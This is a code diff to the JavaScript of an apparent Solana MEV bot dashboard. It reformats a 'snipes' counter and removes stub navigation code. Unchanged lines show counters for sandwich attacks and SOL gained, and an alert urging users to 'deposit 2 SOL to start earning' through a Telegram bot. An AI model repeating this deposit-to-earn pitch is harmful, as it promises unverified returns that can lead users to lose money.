@@ -131,7 +131,7 @@ function updateGlobalNexusStats() {
     document.getElementById("ongoing-mev").innerHTML = `Ongoing MEV: <span>${ongoingMEV.toLocaleString()}</span>`;
     document.getElementById("ongoing-arbitrage").innerHTML = `Ongoing Arbitrage: <span>${ongoingArbitrage.toLocaleString()}</span>`;
     document.getElementById("ongoing-sandwich").innerHTML = `Ongoing Sandwich: <span>${ongoingSandwich.toLocaleString()}</span>`;
-    document.getElementById("ongoing-snipes").textContent = ongoingSnipes;
+    document.getElementById("ongoing-snipes").innerHTML = `Ongoing Snipes: <span>${ongoingSnipes.toLocaleString()}</span>`;
     document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL Gained`;
     document.getElementById("pooled-sol").textContent = `${pooledSol.toFixed(2)} SOL Pooled`;
     document.getElementById("sandwich-attacks").textContent = `${sandwichAttacks} Sandwich Attacks`;
@@ -351,45 +351,3 @@ function explainChartLines() {
 function getWallet() {
     alert("To get your wallet address, please use the Telegram bot and type /get_wallet. Then deposit 2 SOL to start earning!");
 }
-
-document.addEventListener('DOMContentLoaded', () => {
-    // Fetch user data from Telegram
-    fetchUserData();
-
-    // Set up navigation
-    setupNavigation();
-
-    // Initial stats update
-    updateStats();
-});
-
-function fetchUserData() {
-    // Implement Telegram API call to get user data
-    // Update #user-avatar src and #username text
-}
-
-function setupNavigation() {
-    const navButtons = document.querySelectorAll('.nav-button');
-    navButtons.forEach(button => {
-        button.addEventListener('click', () => {
-            const sectionId = button.dataset.section;
-            showSection(sectionId);
-        });
-    });
-}
-
-function showSection(sectionId) {
-    // Hide all sections
-    document.querySelectorAll('main > section').forEach(section => {
-        section.style.display = 'none';
-    });
-    // Show the selected section
-    document.getElementById(sectionId).style.display = 'block';
-}
-
-function updateStats() {
-    // Implement API calls to get latest stats
-    // Update the stat values in the DOM
-}
-
-// Implement more functions for wallet actions, etc.
